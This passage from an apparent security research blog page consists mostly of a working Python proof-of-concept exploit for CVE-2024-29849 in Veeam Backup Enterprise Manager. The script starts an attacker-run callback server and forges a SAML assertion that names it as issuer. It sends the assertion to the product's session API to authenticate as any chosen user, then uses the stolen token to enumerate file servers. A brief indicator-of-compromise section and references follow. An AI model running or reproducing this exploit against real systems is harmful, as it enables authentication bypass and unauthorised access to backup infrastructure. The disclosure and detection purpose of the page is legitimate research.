</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;(!) Could not fetch certificate: </span><span style=color:#e6db74>{</span>e<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>None</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    x509_cert <span style=color:#f92672>=</span> OpenSSL<span style=color:#f92672>.</span>crypto<span style=color:#f92672>.</span>load_certificate(OpenSSL<span style=color:#f92672>.</span>crypto<span style=color:#f92672>.</span>FILETYPE_PEM, cert)
</span></span><span style=display:flex><span>    crypto_cert <span style=color:#f92672>=</span> x509<span style=color:#f92672>.</span>load_pem_x509_certificate(cert<span style=color:#f92672>.</span>encode(), default_backend())
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    cn <span style=color:#f92672>=</span> <span style=color:#66d9ef>None</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> attribute <span style=color:#f92672>in</span> crypto_cert<span style=color:#f92672>.</span>subject:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> attribute<span style=color:#f92672>.</span>oid <span style=color:#f92672>==</span> x509<span style=color:#f92672>.</span>NameOID<span style=color:#f92672>.</span>COMMON_NAME:
</span></span><span style=display:flex><span>            cn <span style=color:#f92672>=</span> attribute<span style=color:#f92672>.</span>value
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>break</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> cn <span style=color:#f92672>!=</span> <span style=color:#66d9ef>None</span>:
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;(*) Common Name (CN) extracted from certificate: </span><span style=color:#e6db74>{</span>cn<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>        domain_name <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>cn<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#34;.&#34;</span>)[<span style=color:#f92672>-</span><span style=color:#ae81ff>2</span>]<span style=color:#e6db74>}</span><span style=color:#e6db74>.</span><span style=color:#e6db74>{</span>cn<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#34;.&#34;</span>)[<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>]<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;(*) Assumed domain name: </span><span style=color:#e6db74>{</span>domain_name<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>        answer <span style=color:#f92672>=</span> input(<span style=color:#e6db74>&#34;(?) Is the assumed domain name correct(Y/n)?&#34;</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> answer<span style=color:#f92672>.</span>lower() <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;y&#34;</span>:
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> domain_name
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>            domain_name <span style=color:#f92672>=</span> input(<span style=color:#e6db74>&#34;(*) Enter the correct domain name: &#34;</span>)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> domain_name
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>sanity_check_target</span>(target):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>        r <span style=color:#f92672>=</span> s<span style=color:#f92672>.</span>get(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>target<span style=color:#f92672>.</span>rstrip(<span style=color:#e6db74>&#39;/&#39;</span>)<span style=color:#e6db74>}</span><span style=color:#e6db74>/api/&#34;</span>, verify<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>Exception</span> <span style=color:#66d9ef>as</span> e:
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;(!) Could not reach the target: </span><span style=color:#e6db74>{</span>e<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>        exit(<span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#34;www.veeam.com/ent/v1.0&#34;</span> <span style=color:#f92672>not</span> <span style=color:#f92672>in</span> r<span style=color:#f92672>.</span>text:
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#34;(!) The target does not seem to be a Veeam Backup Enterprise Manager&#34;</span>)
</span></span><span style=display:flex><span>        exit(<span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;(*) Target </span><span style=color:#e6db74>{</span>target<span style=color:#e6db74>}</span><span style=color:#e6db74> is reachable and seems to be a Veeam Backup Enterprise Manager&#34;</span>)
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>sanity_files</span>():
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> os<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>exists(<span style=color:#e6db74>&#34;server.pem&#34;</span>) <span style=color:#f92672>or</span> <span style=color:#f92672>not</span> os<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>exists(<span style=color:#e6db74>&#34;key.pem&#34;</span>):
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#34;(!) server.pem or key.pem not found, please generate them using the following command:&#34;</span>)
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#34;openssl req -new -x509 -keyout key.pem -out server.pem -days 365 -nodes&#34;</span>)
</span></span><span style=display:flex><span>        exit(<span style=color:#ae81ff>1</span>)    
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>sanity_check_callback_server</span>(callback_server):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> <span style=color:#f92672>not</span> server_ready:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>pass</span>
</span></span><span style=display:flex><span>    counter <span style=color:#f92672>=</span> <span style=color:#ae81ff>5</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> counter:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>            r <span style=color:#f92672>=</span> s<span style=color:#f92672>.</span>get(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;https://</span><span style=color:#e6db74>{</span>callback_server<span style=color:#e6db74>}</span><span style=color:#e6db74>/&#34;</span>, verify<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)
</span></span><span style=display:flex><span>            counter <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>                
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>Exception</span> <span style=color:#66d9ef>as</span> e:
</span></span><span style=display:flex><span>            print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;(*) Checking callback server&#34;</span>)
</span></span><span style=display:flex><span>            counter <span style=color:#f92672>-=</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> r <span style=color:#f92672>==</span> <span style=color:#66d9ef>None</span>:
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;(!) Could not reach the callback server </span><span style=color:#e6db74>{</span>callback_server<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>        exit(<span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;(*) Callback server </span><span style=color:#e6db74>{</span>callback_server<span style=color:#e6db74>}</span><span style=color:#e6db74> is reachable&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>exploit</span>(target_user):
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;(*) Triggering malicious SAML assertion to </span><span style=color:#e6db74>{</span>args<span style=color:#f92672>.</span>target<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;(*) Impersonating user: </span><span style=color:#e6db74>{</span>target_user<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>        xml_b64_body <span style=color:#f92672>=</span> base64<span style=color:#f92672>.</span>b64encode(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;&#39;&#39;&lt;saml2:Assertion xmlns:saml2=&#34;urn:oasis:names:tc:SAML:2.0:assertion&#34;&gt;&lt;saml2:Issuer&gt;https://</span><span style=color:#e6db74>{</span>args<span style=color:#f92672>.</span>callback_server<span style=color:#e6db74>}</span><span style=color:#e6db74>/STSService&lt;/saml2:Issuer&gt;&lt;saml2:Subject&gt;&lt;saml2:NameID&gt;</span><span style=color:#e6db74>{</span>target_user<span style=color:#e6db74>}</span><span style=color:#e6db74>&lt;/saml2:NameID&gt;&lt;saml2:SubjectConfirmation&gt;&lt;saml2:SubjectConfirmationData NotOnOrAfter=&#34;2024-12-12T00:00:00Z&#34; /&gt;&lt;/saml2:SubjectConfirmation&gt;&lt;/saml2:Subject&gt;&lt;saml2:AuthnStatement AuthnInstant=&#34;2024-06-01T00:00:00Z&#34;&gt;&lt;saml2:AuthnContext&gt;&lt;saml2:AuthnContextClassRef&gt;urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport&lt;/saml2:AuthnContextClassRef&gt;&lt;/saml2:AuthnContext&gt;&lt;/saml2:AuthnStatement&gt;&lt;saml2:AttributeStatement&gt;&lt;saml2:Attribute Name=&#34;http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress&#34;&gt;&lt;saml2:AttributeValue&gt;&lt;/saml2:AttributeValue&gt;&lt;/saml2:Attribute&gt;&lt;saml2:Attribute Name=&#34;http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name&#34;&gt;&lt;saml2:AttributeValue&gt;&lt;/saml2:AttributeValue&gt;&lt;/saml2:Attribute&gt;&lt;/saml2:AttributeStatement&gt;&lt;/saml2:Assertion&gt;&#39;&#39;&#39;</span><span style=color:#f92672>.</span>encode(<span style=color:#e6db74>&#39;utf-8&#39;</span>))<span style=color:#f92672>.</span>decode(<span style=color:#e6db74>&#39;utf-8&#39;</span>)
</span></span><span style=display:flex><span>        r <span style=color:#f92672>=</span> s<span style=color:#f92672>.</span>post(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>args<span style=color:#f92672>.</span>target<span style=color:#f92672>.</span>rstrip(<span style=color:#e6db74>&#39;/&#39;</span>)<span style=color:#e6db74>}</span><span style=color:#e6db74>/api/sessionMngr/?v=latest&#34;</span>, headers<span style=color:#f92672>=</span>{<span style=color:#e6db74>&#34;Content-type&#34;</span>:<span style=color:#e6db74>&#34;application/json&#34;</span>},  json<span style=color:#f92672>=</span>{<span style=color:#e6db74>&#34;VMwareSSOToken&#34;</span>: xml_b64_body})
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>Exception</span> <span style=color:#66d9ef>as</span> e:
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;(!) Could not send the malicious SAML assertion to </span><span style=color:#e6db74>{</span>args<span style=color:#f92672>.</span>target<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>        print(e)
</span></span><span style=display:flex><span>        exit(<span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(r<span style=color:#f92672>.</span>status_code <span style=color:#f92672>!=</span> <span style=color:#ae81ff>201</span>):
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;(!) Exploit failed, result was: </span><span style=color:#e6db74>{</span>r<span style=color:#f92672>.</span>text<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>        print(r)
</span></span><span style=display:flex><span>        exit(<span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(r<span style=color:#f92672>.</span>headers[<span style=color:#e6db74>&#39;X-Restsvcsessionid&#39;</span>] <span style=color:#f92672>!=</span> <span style=color:#66d9ef>None</span>):
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>(+) Exploit was Successful, authenticated as </span><span style=color:#e6db74>{</span>target_user<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;(*) Got token: </span><span style=color:#e6db74>{</span>r<span style=color:#f92672>.</span>headers[<span style=color:#e6db74>&#39;X-Restsvcsessionid&#39;</span>]<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> r<span style=color:#f92672>.</span>headers[<span style=color:#e6db74>&#39;X-Restsvcsessionid&#39;</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>post_exploit</span>(token):
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;(*) Starting post-exploitation phase&#34;</span>)
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;(*) Retrieving the list of file servers&#34;</span>)
</span></span><span style=display:flex><span>    r <span style=color:#f92672>=</span> s<span style=color:#f92672>.</span>get(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>args<span style=color:#f92672>.</span>target<span style=color:#f92672>.</span>rstrip(<span style=color:#e6db74>&#39;/&#39;</span>)<span style=color:#e6db74>}</span><span style=color:#e6db74>/api/nas/fileServers?format=Entity&#34;</span>, verify<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>, headers<span style=color:#f92672>=</span>{<span style=color:#e6db74>&#34;Accept&#34;</span>:<span style=color:#e6db74>&#34;application/json&#34;</span>,<span style=color:#e6db74>&#34;Content-Type&#34;</span>:<span style=color:#e6db74>&#34;application/json&#34;</span>,<span style=color:#e6db74>&#34;X-Restsvcsessionid&#34;</span>:token})
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>        print(r<span style=color:#f92672>.</span>json())
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>except</span>:
</span></span><span style=display:flex><span>        print(r<span style=color:#f92672>.</span>text)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>s <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>Session()
</span></span><span style=display:flex><span>s<span style=color:#f92672>.</span>verify <span style=color:#f92672>=</span> <span style=color:#66d9ef>False</span>
</span></span><span style=display:flex><span>server_ready <span style=color:#f92672>=</span> <span style=color:#66d9ef>False</span>
</span></span><span style=display:flex><span>sanity_files()
</span></span><span style=display:flex><span>sanity_check_target(args<span style=color:#f92672>.</span>target)
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(args<span style=color:#f92672>.</span>domain_name <span style=color:#f92672>==</span> <span style=color:#66d9ef>None</span>):
</span></span><span style=display:flex><span>    args<span style=color:#f92672>.</span>domain_name <span style=color:#f92672>=</span> get_cn_from_cert(args<span style=color:#f92672>.</span>target)
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;(*) Target domain name is: </span><span style=color:#e6db74>{</span>args<span style=color:#f92672>.</span>domain_name<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>args<span style=color:#f92672>.</span>target_user <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>args<span style=color:#f92672>.</span>target_user<span style=color:#e6db74>}</span><span style=color:#e6db74>@</span><span style=color:#e6db74>{</span>args<span style=color:#f92672>.</span>domain_name<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#34;(*) Starting callback server&#34;</span>)
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>(^_^) Prepare for the Pwnage (^_^)</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>callback_server_thread <span style=color:#f92672>=</span> Thread(target<span style=color:#f92672>=</span>start_callback_server, args<span style=color:#f92672>=</span>(args<span style=color:#f92672>.</span>callback_server<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#34;:&#34;</span>)[<span style=color:#ae81ff>0</span>], int(args<span style=color:#f92672>.</span>callback_server<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#34;:&#34;</span>)[<span style=color:#ae81ff>1</span>]),))
</span></span><span style=display:flex><span>callback_server_thread<span style=color:#f92672>.</span>setDaemon(<span style=color:#66d9ef>True</span>)
</span></span><span style=display:flex><span>callback_server_thread<span style=color:#f92672>.</span>start()
</span></span><span style=display:flex><span>sanity_check_callback_server(args<span style=color:#f92672>.</span>callback_server)
</span></span><span style=display:flex><span>pwned_token <span style=color:#f92672>=</span> exploit(args<span style=color:#f92672>.</span>target_user)
</span></span><span style=display:flex><span>post_exploit(pwned_token)
</span></span></code></pre></div><h1 id=ioc>IoC</h1><p>There exist a log file at:</p><pre tabindex=0><code>C:\ProgramData\Veeam\Backup\Svc.VeeamRestAPI.log
</code></pre><p>Search for <code>Validating Single Sign-On token. Service enpoint URL:</code> inside this file and if you see it, that means, you&rsquo;ve had an exploitation attempt</p><p><img src=https://summoning.team/images/blog/veeam-epm/ioc.png alt=veeam-CVE-2024-29849></p><h1 id=references>References</h1><ul><li><a href=https://github.com/sinsinology/CVE-2024-29849>https://github.com/sinsinology/CVE-2024-29849</a></li><li><a href=https://www.veeam.com/kb4581>https://www.veeam.com/kb4581</a></li></ul></div></article><script defer src=https://cdn.jsdelivr.net/npm/alpinejs@3.x.x/dist/cdn.min.js></script>
<script src=https://summoning.team/js/darkmode.js defer></script><footer class=bg-gray-900><div class="max-w-md px-4 py-12 mx-auto overflow-hidden sm:max-w-3xl sm:px-6 lg:max-w-7xl lg:px-8"><nav class="flex flex-wrap justify-center -mx-5 -my-2" aria-label=Footer><div class="px-5 py-2"><a href=https://summoning.team/training/ class="text-base text-gray-400 hover:text-gray-300">Training</a></div><div class="px-5 py-2"><a href=https://summoning.team/blog/ class="text-base text-gray-400 hover:text-gray-300">Blog</a></div><div class="px-5 py-2"><a href=https://summoning.team/exploits/ class="text-base text-gray-400 hover:text-gray-300">Exploits</a></div><div class="px-5 py-2"><a href=https://summoning.team/advisories/ class="text-base text-gray-400 hover:text-gray-300">Advisories</a></div><div class="px-5 py-2"><a href=https://summoning.team/contact/ class="text-base text-gray-400 hover:text-gray-300">Contact</a></div></nav><div class="flex justify-center mt-8 space-x-6"><a href=https://twitter.com/SinSinology class="text-gray-400 hover:text-gray-300"><span class=sr-only>Twitter</span><svg class="w-6 h-6" fill="currentcolor" viewBox="0 0 24 24" aria-hidden="true"><path d="M8.29 20.251c7.547.0 11.675-6.253 11.675-11.675.0-.178.0-.355-.012-.53A8.348 8.348.0 0022 5.92a8.19 8.19.0 01-2.357.646 4.118 4.118.0 001.804-2.27 8.224 8.224.0 01-2.605.996 4.107 4.107.0 00-6.993 3.743A11.65 11.65.0 013.392 4.748a4.106 4.106.0 001.27 5.477A4.072 4.072.0 012.8 9.713v.052a4.105 4.105.0 003.292 4.022 4.095 4.095.0 01-1.853.07 4.108 4.108.0 003.834 2.85A8.233 8.233.0 012 18.407a11.616 11.616.0 006.29 1.84"/></svg></a>
<a href=https://github.com/SinSinology class="text-gray-400 hover:text-gray-300"><span class=sr-only>GitHub</span><svg class="w-6 h-6" fill="currentcolor" viewBox="0 0 24 24" aria-hidden="true"><path fill-rule="evenodd" d="M12 2C6.477 2 2 6.484 2 12.017c0 4.425 2.865 8.18 6.839 9.504.5.092.682-.217.682-.483.0-.237-.008-.868-.013-1.703-2.782.605-3.369-1.343-3.369-1.343-.454-1.158-1.11-1.466-1.11-1.466-.908-.62.069-.608.069-.608 1.003.07 1.531 1.032 1.531 1.032.892 1.53 2.341 1.088 2.91.832.092-.647.35-1.088.636-1.338-2.22-.253-4.555-1.113-4.555-4.951.0-1.093.39-1.988 1.029-2.688-.103-.253-.446-1.272.098-2.65.0.0.84-.27 2.75 1.026A9.564 9.564.0 0112 6.844c.85.004 1.705.115 2.504.337 1.909-1.296 2.747-1.027 2.747-1.027.546 1.379.202 2.398.1 2.651.64.7 1.028 1.595 1.028 2.688.0 3.848-2.339 4.695-4.566 4.943.359.309.678.92.678 1.855.0 1.338-.012 2.419-.012 2.747.0.268.18.58.688.482A10.019 10.019.0 0022 12.017C22 6.484 17.522 2 12 2z" clip-rule="evenodd"/></svg></a></div><p class="mt-8 text-base text-center text-gray-400">&copy; 2024
Summoning Team All rights
reserved.</p></div></footer></body></html>